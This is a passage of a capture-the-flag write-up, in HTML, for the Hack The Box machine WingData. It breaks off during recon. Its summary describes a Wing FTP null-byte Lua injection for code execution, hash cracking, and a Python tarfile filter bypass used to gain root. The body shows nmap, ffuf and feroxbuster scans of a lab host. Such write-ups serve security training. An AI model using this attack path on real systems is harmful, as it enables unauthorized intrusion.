@@ -1,0 +1,1349 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta name="name" content="HTB: WingData">
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>HTB: WingData | 0xdf hacks stuff</title>
+<meta name="generator" content="Jekyll v4.4.1" />
+<meta property="og:title" content="HTB: WingData" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="WingData runs a Wing FTP Server instance with anonymous access enabled. I’ll abuse a null-byte injection flaw in the web interface that smuggles Lua code into the session file, giving remote code execution and a shell. From there, I’ll find Wing FTP’s account files holding salted password hashes, crack one, and reuse it to move to the next user. That user can run a Python backup-restore script as root that unpacks tar archives using the tarfile module’s “data” extraction filter. I’ll exploit a path-validation bypass in that filter to write outside the extraction directory and drop a key into the root account for full access." />
+<meta property="og:description" content="WingData runs a Wing FTP Server instance with anonymous access enabled. I’ll abuse a null-byte injection flaw in the web interface that smuggles Lua code into the session file, giving remote code execution and a shell. From there, I’ll find Wing FTP’s account files holding salted password hashes, crack one, and reuse it to move to the next user. That user can run a Python backup-restore script as root that unpacks tar archives using the tarfile module’s “data” extraction filter. I’ll exploit a path-validation bypass in that filter to write outside the extraction directory and drop a key into the root account for full access." />
+<link rel="canonical" href="https://0xdf.gitlab.io/2026/06/27/htb-wingdata.html" />
+<meta property="og:url" content="https://0xdf.gitlab.io/2026/06/27/htb-wingdata.html" />
+<meta property="og:site_name" content="0xdf hacks stuff" />
+<meta property="og:image" content="https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/wingdata-cover.png" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2026-06-27T13:45:00+00:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:image" content="https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/wingdata-cover.png" />
+<meta property="twitter:title" content="HTB: WingData" />
+<meta name="twitter:site" content="@0xdf_" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2026-06-27T13:45:00+00:00","datePublished":"2026-06-27T13:45:00+00:00","description":"WingData runs a Wing FTP Server instance with anonymous access enabled. I’ll abuse a null-byte injection flaw in the web interface that smuggles Lua code into the session file, giving remote code execution and a shell. From there, I’ll find Wing FTP’s account files holding salted password hashes, crack one, and reuse it to move to the next user. That user can run a Python backup-restore script as root that unpacks tar archives using the tarfile module’s “data” extraction filter. I’ll exploit a path-validation bypass in that filter to write outside the extraction directory and drop a key into the root account for full access.","headline":"HTB: WingData","image":"https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/wingdata-cover.png","mainEntityOfPage":{"@type":"WebPage","@id":"https://0xdf.gitlab.io/2026/06/27/htb-wingdata.html"},"url":"https://0xdf.gitlab.io/2026/06/27/htb-wingdata.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/bootstrap-toc.min.css">
+  <link rel="stylesheet" href="/assets/css/main.css">
+  <link rel="stylesheet" href="/assets/css/custom.css"> 
+  <link rel="stylesheet" href="/assets/css/buymeacoffee.css">
+  
+  <link rel="stylesheet" href="/assets/css/syntax.css">
+  
+<link type="application/atom+xml" rel="alternate" href="https://0xdf.gitlab.io/feed.xml" title="0xdf hacks stuff" /><!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-P056MVQVGM"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-P056MVQVGM');
+</script>
+<!--<script>
+(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+ga('create', 'UA-120216868-1', 'auto');
+ga('send', 'pageview');
+</script>-->
+  
+<link rel="icon" type="image/png" href="/assets/icons/favicon-32x32.png" sizes="32x32" />
+  <link rel="icon" type="image/png" href="/assets/icons/favicon-16x16.png" sizes="16x16" />
+  
+  <link rel="stylesheet" href="/assets/css/links.css">
+  
+</head>
+
+  <body data-spy="scroll" data-toggle="toc" data-offset="150">
+  
+<header class="site-header">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">0xdf hacks stuff</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger">
+            <a class="page-link-site" href="/">Home</a><a class="page-link-site" href="/about">About Me</a><a class="page-link-site" href="/tags">Tags</a><a class="page-link-site" href="/cheatsheets/">Cheatsheets</a><a class="page-link-site bmc" href="https://youtube.com/@0xdf" target="_blank"><img src="/icons/youtube.png" class="svg-icon" alt="" />YouTube</a>
+          <a class="page-link-site bmc" href="https://gitlab.com/0xdf/ctfscripts" target="_blank"><img src="/icons/gitlab.png" class="svg-icon" alt="" />Gitlab</a><a class="page-link-site bmc" href="/feed.xml"><img src="/icons/rss.png" class="svg-icon" alt="" /><span>feed</span></a><a class="page-link-site bmc" target="_blank"
+href="https://www.buymeacoffee.com/0xdf"><img src="https://cdn.buymeacoffee.com/buttons/bmc-new-btn-logo.svg" alt="Buy me a coffee" style="-webkit-filter: drop-shadow(0px 0px 2px white); filter: drop-shadow(0px 0px 2px white);"></a>
+        </div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">HTB: WingData</h1>
+    <p class="post-meta">
+
+<span class="tag-list"><a href="/tags#htb-wingdata" class="post-tag">htb-wingdata</a> <a href="/tags#ctf" class="post-tag">ctf</a> <a href="/tags#hackthebox" class="post-tag">hackthebox</a> <a href="/tags#nmap" class="post-tag">nmap</a> <a href="/tags#debian" class="post-tag">debian</a> <a href="/tags#ffuf" class="post-tag">ffuf</a> <a href="/tags#subdomain" class="post-tag">subdomain</a> <a href="/tags#feroxbuster" class="post-tag">feroxbuster</a> <a href="/tags#wingftp" class="post-tag">wingftp</a> <a href="/tags#cve-2025-47812" class="post-tag">cve-2025-47812</a> <a href="/tags#null-byte" class="post-tag">null-byte</a> <a href="/tags#lua" class="post-tag">lua</a> <a href="/tags#burp" class="post-tag">burp</a> <a href="/tags#burp-repeater" class="post-tag">burp-repeater</a> <a href="/tags#burp-proxy" class="post-tag">burp-proxy</a> <a href="/tags#hashcat" class="post-tag">hashcat</a> <a href="/tags#password-reuse" class="post-tag">password-reuse</a> <a href="/tags#sudo" class="post-tag">sudo</a> <a href="/tags#python" class="post-tag">python</a> <a href="/tags#python-tarfile" class="post-tag">python-tarfile</a> <a href="/tags#cve-2025-4517" class="post-tag">cve-2025-4517</a> <a href="/tags#arbitrary-write" class="post-tag">arbitrary-write</a> <a href="/tags#symlink" class="post-tag">symlink</a> </span><br/><br/>
+
+
+<time class="dt-published" datetime="2026-06-27T13:45:00+00:00" itemprop="datePublished">Jun 27, 2026
+      </time></p>
+
+  </header>
+
+  
+  <!-- Mobile TOC toggle button -->
+  <button class="toc-toggle" onclick="document.body.classList.add('toc-open')" aria-label="Open table of contents">
+    TOC
+  </button>
+
+  <!-- Mobile TOC drawer -->
+  <div class="toc-drawer">
+    <p><a href="/2026/06/27/htb-wingdata.html" style="color: #e6e6e6; text-decoration: none;">HTB: WingData</a></p>
+    <nav id="toc-mobile" data-toggle="toc" onclick="if(event.target.tagName==='A')document.body.classList.remove('toc-open')"></nav>
+  </div>
+
+  <!-- Overlay for mobile drawer -->
+  <div class="toc-overlay" onclick="document.body.classList.remove('toc-open')"></div>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <div class="row">
+      <div class="col-sm-3">
+        <div class="sticky-top">
+		<p><a href="/2026/06/27/htb-wingdata.html" style="color: #e6e6e6; text-decoration: none;">HTB: WingData</a></p>
+	    <!--https://afeld.github.io/bootstrap-toc/-->
+          <nav id="toc" data-toggle="toc"></nav>
+        </div>
+      </div>
+      <div class="col-sm-9" id="postBody">
+        <picture>
+    <source type="image/webp" srcset="https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/wingdata-cover.webp" />
+    <img loading="lazy" src="https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/wingdata-cover.png" alt="WingData" style="float: right; margin-right:50px; margin-left:50px; height:150px;" class="include_image " />
+</picture>
+<p>WingData runs a Wing FTP Server instance with anonymous access enabled. I’ll abuse a null-byte injection flaw in the web interface that smuggles Lua code into the session file, giving remote code execution and a shell. From there, I’ll find Wing FTP’s account files holding salted password hashes, crack one, and reuse it to move to the next user. That user can run a Python backup-restore script as root that unpacks tar archives using the tarfile module’s “data” extraction filter. I’ll exploit a path-validation bypass in that filter to write outside the extraction directory and drop a key into the root account for full access.</p>
+
+<h2 id="box-info">Box Info</h2>
+
+<!-- https://app.hackthebox.com/machines/835 -->
+
+<div class="htb-card platform-htb">
+  <div class="htb-card-header">
+    <div class="htb-box-info">
+      <a href="https://hackthebox.com/machines/wingdata" target="_blank" class="htb-box-icon">
+        <picture>
+          <source type="image/webp" srcset="/icons/box-wingdata.webp" />
+          <img src="/icons/box-wingdata.png" alt="WingData" />
+        </picture>
+      </a>
+      <div class="htb-box-title">
+        <a href="https://hackthebox.com/machines/wingdata" target="_blank" class="htb-box-name">WingData</a>
+      </div>
+    </div><div class="htb-difficulty-badge diff-Easy">
+      Easy
+    </div>
+  </div>
+
+  <div class="htb-card-body">
+    <div class="htb-meta-grid">
+      <div class="htb-meta-item">
+        <span class="htb-meta-label">Release Date</span>
+        <span class="htb-meta-value">
+          
+          <a href="https://twitter.com/hackthebox_eu/status/2021977670876049919">14 Feb 2026</a>
+        </span>
+      </div>
+      
+      <div class="htb-meta-item">
+        <span class="htb-meta-label">Retire Date</span>
+        <span class="htb-meta-value">27 Jun 2026</span>
+      </div>
+      
+      <div class="htb-meta-item">
+        <span class="htb-meta-label">OS</span>
+        <span class="htb-meta-value htb-os">
+          <picture><source type="image/webp" srcset="/icons/Linux.webp" /><img src="/icons/Linux.png" alt="Linux" /></picture>
+          Linux
+        </span>
+      </div>
+    </div>
+
+    <div class="htb-cards">
+      
+      <div class="htb-card-row htb-card-green">
+        <span class="htb-card-label">Rated Difficulty</span>
+        <picture>
+          <source type="image/webp" srcset="https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/wingdata-diff.webp" />
+          <img src="https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/wingdata-diff.png" alt="Rated difficulty for WingData" class="htb-diff-img" />
+        </picture>
+      </div>
+      <div class="htb-card-row htb-card-green htb-card-tall">
+        <span class="htb-card-label">Radar Graph</span>
+        <picture>
+          <source type="image/webp" srcset="https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/wingdata-radar.webp" />
+          <img src="https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/wingdata-radar.png" alt="Radar chart for WingData" class="htb-radar-img" />
+        </picture>
+      </div>
+      
+      
+      <div class="htb-card-row htb-card-red">
+        <div class="htb-blood-chip">
+          <svg width="20" height="20" viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M9.17728 1.8663C9.39181 1.53976 9.75455 1.36377 10.1194 1.36377C10.4845 1.36377 10.8474 1.53992 11.0619 1.86677C11.2785 2.19751 11.5887 2.67967 11.9582 3.25725C12.1814 3.60619 12.0794 4.07 11.7305 4.29319C11.3816 4.51638 10.9178 4.41445 10.6946 4.06551C10.479 3.72853 10.285 3.42614 10.1186 3.16844C9.45753 4.18835 8.37959 5.89633 7.40828 7.656C6.83514 8.69432 6.30663 9.73721 5.92344 10.6594C5.52883 11.609 5.32959 12.3362 5.32959 12.7789C5.32959 15.1536 7.4206 17.172 10.1194 17.172C11.6175 17.172 12.9428 16.5425 13.8158 15.5721C14.0929 15.2641 14.5671 15.239 14.875 15.5161C15.183 15.7931 15.208 16.2673 14.931 16.5753C13.7716 17.8641 12.0399 18.672 10.1194 18.672C6.69911 18.672 3.82959 16.0851 3.82959 12.7789C3.82959 12.0155 4.13669 11.0502 4.53827 10.0838C4.95126 9.08991 5.50879 7.99321 6.09505 6.93112C7.26832 4.80557 8.58701 2.76434 9.17728 1.8663Z" fill="currentColor" /><path d="M12.4256 10.0001C11.9254 10.0001 11.5003 9.81776 11.1502 9.45318C10.8 9.0886 10.625 8.64589 10.625 8.12505C10.625 7.60422 10.8 7.16151 11.1502 6.79693C11.5003 6.43235 11.9254 6.25005 12.4256 6.25005C12.9257 6.25005 13.3509 6.43235 13.701 6.79693C14.0511 7.16151 14.2262 7.60422 14.2262 8.12505C14.2262 8.64589 14.0511 9.0886 13.701 9.45318C13.3509 9.81776 12.9257 10.0001 12.4256 10.0001Z" fill="currentColor" /><path d="M8.82438 12.8126V12.5001C8.82438 12.3004 8.87648 12.1116 8.98068 11.9336C9.08488 11.7557 9.22868 11.606 9.41208 11.4844C9.87056 11.2067 10.3553 10.994 10.8662 10.8464C11.3772 10.6988 11.8961 10.6251 12.423 10.6251C12.9499 10.6251 13.4697 10.6988 13.9823 10.8464C14.495 10.994 14.9806 11.2067 15.4391 11.4844C15.6225 11.5973 15.7663 11.7448 15.8705 11.9271C15.9747 12.1094 16.0268 12.3004 16.0268 12.5001V12.8126C16.0268 13.0704 15.9386 13.2911 15.7622 13.4747C15.5857 13.6583 15.3737 13.7501 15.126 13.7501H9.72114C9.47342 13.7501 9.26203 13.6583 9.08697 13.4747C8.91191 13.2911 8.82438 13.0704 8.82438 12.8126Z" fill="currentColor" /></svg>
+          <span class="htb-blood-label">User</span>
+        </div>
+        <div class="htb-blood-info">
+          <span class="htb-blood-time"><span class="htb-blood-clock">00:07:18</span></span><a href="https://app.hackthebox.com/users/588513" target="_blank" rel="noopener"><img alt="Opcode" src="https://www.hackthebox.com/badge/image/588513" style="display: unset" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" /><span class="user-text" style="display: none"> Opcode</span></a><br /></div>
+      </div>
+      <div class="htb-card-row htb-card-red">
+        <div class="htb-blood-chip">
+          <svg width="20" height="20" viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M9.17728 1.8663C9.39181 1.53976 9.75455 1.36377 10.1194 1.36377C10.4845 1.36377 10.8474 1.53992 11.0619 1.86677C11.2785 2.19751 11.5887 2.67967 11.9582 3.25725C12.1814 3.60619 12.0794 4.07 11.7305 4.29319C11.3816 4.51638 10.9178 4.41445 10.6946 4.06551C10.479 3.72853 10.285 3.42614 10.1186 3.16844C9.45753 4.18835 8.37959 5.89633 7.40828 7.656C6.83514 8.69432 6.30663 9.73721 5.92344 10.6594C5.52883 11.609 5.32959 12.3362 5.32959 12.7789C5.32959 15.1536 7.4206 17.172 10.1194 17.172C11.6175 17.172 12.9428 16.5425 13.8158 15.5721C14.0929 15.2641 14.5671 15.239 14.875 15.5161C15.183 15.7931 15.208 16.2673 14.931 16.5753C13.7716 17.8641 12.0399 18.672 10.1194 18.672C6.69911 18.672 3.82959 16.0851 3.82959 12.7789C3.82959 12.0155 4.13669 11.0502 4.53827 10.0838C4.95126 9.08991 5.50879 7.99321 6.09505 6.93112C7.26832 4.80557 8.58701 2.76434 9.17728 1.8663Z" fill="currentColor" /><path d="M10.7 13.5H9.3V12.1H10.7V13.5ZM10.7 10.7H9.3V6.5H10.7V10.7Z" fill="currentColor" /></svg>
+          <span class="htb-blood-label">Root</span>
+        </div>
+        <div class="htb-blood-info">
+          <span class="htb-blood-time"><span class="htb-blood-clock">00:20:01</span></span><a href="https://app.hackthebox.com/users/1102126" target="_blank" rel="noopener"><img alt="Arsen44" src="https://www.hackthebox.com/badge/image/1102126" style="display: unset" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" /><span class="user-text" style="display: none"> Arsen44</span></a><br /></div>
+      </div>
+      
+      <div class="htb-card-row htb-card-blue">
+        <span class="htb-card-label">Creator</span>
+        
+<a href="https://app.hackthebox.com/users/305136" target="_blank" rel="noopener"><img alt="WackyH4cker" src="https://www.hackthebox.com/badge/image/305136" style="display: unset" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" /><span class="user-text" style="display: none"> WackyH4cker</span></a><br />
+      </div>
+    </div>
+
+    
+  </div>
+</div>
+<h2 id="recon">Recon</h2>
+
+<h3 id="initial-scanning">Initial Scanning</h3>
+
+<p><code class="language-plaintext highlighter-rouge">nmap</code> finds two open TCP ports, SSH (22) and HTTP (80):</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">sudo </span>nmap <span class="nt">-p-</span> <span class="nt">--reason</span> <span class="nt">--min-rate</span> 10000 10.129.244.106
+<span class="go">Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-06-18 19:20 UTC
+Nmap scan report for 10.129.244.106
+Host is up, received echo-reply ttl 63 (0.019s latency).
+Not shown: 65533 filtered tcp ports (no-response)
+PORT   STATE SERVICE REASON
+22/tcp open  ssh     syn-ack ttl 63
+80/tcp open  http    syn-ack ttl 63
+
+Nmap done: 1 IP address (1 host up) scanned in 13.36 seconds
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">sudo </span>nmap <span class="nt">-p</span> 22,80 <span class="nt">-sCV</span> 10.129.244.106
+<span class="go">Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-06-18 19:20 UTC
+Nmap scan report for 10.129.244.106
+Host is up (0.021s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
+| ssh-hostkey: 
+|   256 a1:fa:95:8b:d7:56:03:85:e4:45:c9:c7:1e:ba:28:3b (ECDSA)
+|_  256 9c:ba:21:1a:97:2f:3a:64:73:c1:4c:1d:ce:65:7a:2f (ED25519)
+80/tcp open  http    Apache httpd 2.4.66
+|_http-title: Did not follow redirect to http://wingdata.htb/
+|_http-server-header: Apache/2.4.66 (Debian)
+Service Info: Host: localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 11.65 seconds
+</span></code></pre></div></div>
+
+<p>Based on the <a href="/cheatsheets/os#debian">OpenSSH version</a> versions, the host is likely running Debian 12 Bookworm.</p>
+
+<p>Both of the ports show a TTL of 63, which matches the <a href="/cheatsheets/os#os-identification">expected TTL</a> for Linux one hop away.</p>
+
+<h3 id="subdomain-fuzz">Subdomain Fuzz</h3>
+
+<p><code class="language-plaintext highlighter-rouge">nmap</code> shows a redirect to <code class="language-plaintext highlighter-rouge">wingdata.htb</code> on port 80. I’ll use <code class="language-plaintext highlighter-rouge">ffuf</code> to bruteforce for subdomains that respond differently:</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>ffuf <span class="nt">-u</span> http://10.129.244.106 <span class="nt">-H</span> <span class="s2">"Host: FUZZ.wingdata.htb"</span> <span class="nt">-w</span> /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt <span class="nt">-ac</span>
+<span class="go">
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://10.129.244.106
+ :: Wordlist         : FUZZ: /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt
+ :: Header           : Host: FUZZ.wingdata.htb
+ :: Follow redirects : false
+ :: Calibration      : true
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+________________________________________________
+
+ftp                     [Status: 200, Size: 678, Words: 44, Lines: 10, Duration: 52ms]
+:: Progress: [19966/19966] :: Job [1/1] :: 2061 req/sec :: Duration: [0:00:10] :: Errors: 0 ::
+</span></code></pre></div></div>
+
+<p>It finds <code class="language-plaintext highlighter-rouge">ftp.wingdata.htb</code>. I’ll add both to my local <code class="language-plaintext highlighter-rouge">hosts</code> file:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>10.129.244.106 wingdata.htb ftp.wingdata.htb
+</code></pre></div></div>
+
+<p>I’ll rescan each domain with <code class="language-plaintext highlighter-rouge">nmap</code> using scripts, but not find anything important.</p>
+
+<h3 id="wingdatahtb---tcp-80">wingdata.htb - TCP 80</h3>
+
+<h4 id="site">Site</h4>
+
+<p>The site is for a file sharing product:</p>
+
+<div style="position: relative; min-height: 500px;">
+    <picture>
+        <source type="image/webp" srcset="https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260618090404914.webp" />
+        <img loading="lazy" src="https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260618090404914.png" alt="image-20260618090404914" style="max-height: 500px; object-fit: cover; object-position: top; width: -webkit-fill-available; mask-image: linear-gradient(rgb(0, 0, 0), rgb(0,0,0) calc(100% - 100px), rgba(0,0,0,0) calc(100% - 20px)); -webkit-mask-image: linear-gradient(rgb(0, 0, 0), rgb(0,0,0) calc(100% - 100px), rgba(0,0,0,0) calc(100% - 20px));" class="include_image " />
+    </picture>
+    <a href="javascript:void(0)" onclick="click_expand_image(event)" style="position: absolute; bottom: 35px; right: 15px;" title="Click to expand for full content"><img src="/icons/expand.png" alt="expand" class="expand-contract" /></a>
+</div>
+
+<p>It offers “AES-256 encryption and recipient authentication”. There’s a contact form at the bottom, but it just sends an HTTP POST with the data to <code class="language-plaintext highlighter-rouge">/</code>, and there’s no indications it’s actually hooked into anything.</p>
+
+<p>All of the links lead to anchor points on the page, except “Client Portal”, which leads to <code class="language-plaintext highlighter-rouge">ftp.wingdata.htb</code>.</p>
+
+<h4 id="tech-stack">Tech Stack</h4>
+
+<p>The HTTP response headers show boring Apache response:</p>
+
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
+<span class="na">Date</span><span class="p">:</span> <span class="s">Thu, 18 Jun 2026 13:03:31 GMT</span>
+<span class="na">Server</span><span class="p">:</span> <span class="s">Apache/2.4.66 (Debian)</span>
+<span class="na">Last-Modified</span><span class="p">:</span> <span class="s">Sun, 02 Nov 2025 22:38:13 GMT</span>
+<span class="na">ETag</span><span class="p">:</span> <span class="s">"30cc-642a4410baebe-gzip"</span>
+<span class="na">Accept-Ranges</span><span class="p">:</span> <span class="s">bytes</span>
+<span class="na">Vary</span><span class="p">:</span> <span class="s">Accept-Encoding</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">12492</span>
+<span class="na">Keep-Alive</span><span class="p">:</span> <span class="s">timeout=5, max=100</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">Keep-Alive</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html</span>
+</code></pre></div></div>
+
+<p>The main page loads as <code class="language-plaintext highlighter-rouge">index.html</code>, suggesting a static site. The 404 page is the default Apache 404:</p>
+
+<picture>
+    <source type="image/webp" srcset="https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260618091244839.webp" />
+    <img loading="lazy" src="https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260618091244839.png" alt="image-20260618091244839" class="include_image " />
+</picture>
+
+<h4 id="directory-brute-force">Directory Brute Force</h4>
+
+<p>I’ll run <code class="language-plaintext highlighter-rouge">feroxbuster</code> against the site, and include <code class="language-plaintext highlighter-rouge">-x html</code> since I know the site has raw HTML pages:</p>
+
+<div class="language-console code-collapse highlighter-rouge" data-trunc="300"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>feroxbuster <span class="nt">-u</span> http://wingdata.htb <span class="nt">-x</span> html
+<span class="go">                                                                                                                                       
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+by Ben "epi" Risher 🤓                 ver: 2.11.0
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ http://wingdata.htb
+ 🚀  Threads               │ 50
+ 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+ 👌  Status Codes          │ All Status Codes!
+ 💥  Timeout (secs)        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.11.0
+ 🔎  Extract Links         │ true
+ 💲  Extensions            │ [html]
+ 🏁  HTTP methods          │ [GET]
+ 🔃  Recursion Depth       │ 4
+ 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Management Menu™
+──────────────────────────────────────────────────
+</span><span class="feroxbuster-red">403</span><span class="go">      GET        9l       29w      317c </span><span class="feroxbuster-green">Auto-filtering </span><span class="go">found </span><span class="feroxbuster-red">404</span><span class="go">-like response and created new filter; toggle off with </span><span class="feroxbuster-yellow">--dont-filter</span><span class="go">
+</span><span class="feroxbuster-red">404</span><span class="go">      GET        9l       32w      314c </span><span class="feroxbuster-green">Auto-filtering </span><span class="go">found </span><span class="feroxbuster-red">404</span><span class="go">-like response and created new filter; toggle off with </span><span class="feroxbuster-yellow">--dont-filter</span><span class="go">
+</span><span class="feroxbuster-green">200</span><span class="go">      GET      151l      333w     3905c http://wingdata.htb/assets/js/templatemo-custom.js
+</span><span class="feroxbuster-green">200</span><span class="go">      GET      251l     1069w    12492c http://wingdata.htb/index.html
+</span><span class="feroxbuster-green">200</span><span class="go">      GET      193l      571w     5974c http://wingdata.htb/assets/js/animation.js
+</span><span class="feroxbuster-green">200</span><span class="go">      GET      186l      505w     4928c http://wingdata.htb/assets/css/owl.css
+</span><span class="feroxbuster-green">200</span><span class="go">      GET       44l      333w    19982c http://wingdata.htb/assets/images/contact-decoration.png
+</span><span class="feroxbuster-yellow">301</span><span class="go">      GET        9l       29w      353c http://wingdata.htb/assets =&gt; </span><span class="feroxbuster-yellow">http://wingdata.htb/assets/</span><span class="go">
+</span><span class="feroxbuster-green">200</span><span class="go">      GET      149l      837w    67141c http://wingdata.htb/assets/images/about-left-image.png
+</span><span class="feroxbuster-green">200</span><span class="go">      GET      496l     1721w    13281c http://wingdata.htb/assets/js/imagesloaded.js
+</span><span class="feroxbuster-green">200</span><span class="go">      GET     1577l     3269w    31620c http://wingdata.htb/assets/css/templatemo-space-dynamic.css
+</span><span class="feroxbuster-green">200</span><span class="go">      GET        4l       64w    23742c http://wingdata.htb/assets/css/fontawesome.css
+</span><span class="feroxbuster-green">200</span><span class="go">      GET        7l     1002w    80223c http://wingdata.htb/vendor/bootstrap/js/bootstrap.bundle.min.js
+</span><span class="feroxbuster-green">200</span><span class="go">      GET     3158l     6952w    76080c http://wingdata.htb/assets/css/animated.css
+</span><span class="feroxbuster-green">200</span><span class="go">      GET     3448l    10094w    93438c http://wingdata.htb/assets/js/owl-carousel.js
+</span><span class="feroxbuster-green">200</span><span class="go">      GET        2l     1283w    86927c http://wingdata.htb/vendor/jquery/jquery.min.js
+</span><span class="feroxbuster-yellow">301</span><span class="go">      GET        9l       29w      356c http://wingdata.htb/assets/js =&gt; </span><span class="feroxbuster-yellow">http://wingdata.htb/assets/js/</span><span class="go">
+</span><span class="feroxbuster-yellow">301</span><span class="go">      GET        9l       29w      357c http://wingdata.htb/assets/css =&gt; </span><span class="feroxbuster-yellow">http://wingdata.htb/assets/css/</span><span class="go">
+</span><span class="feroxbuster-yellow">301</span><span class="go">      GET        9l       29w      360c http://wingdata.htb/assets/images =&gt; </span><span class="feroxbuster-yellow">http://wingdata.htb/assets/images/</span><span class="go">
+</span><span class="feroxbuster-green">200</span><span class="go">      GET      329l     1996w   148839c http://wingdata.htb/assets/images/banner-right-image.png
+</span><span class="feroxbuster-green">200</span><span class="go">      GET    10724l    20204w   204037c http://wingdata.htb/vendor/bootstrap/css/bootstrap.min.css
+</span><span class="feroxbuster-green">200</span><span class="go">      GET      251l     1069w    12492c http://wingdata.htb/
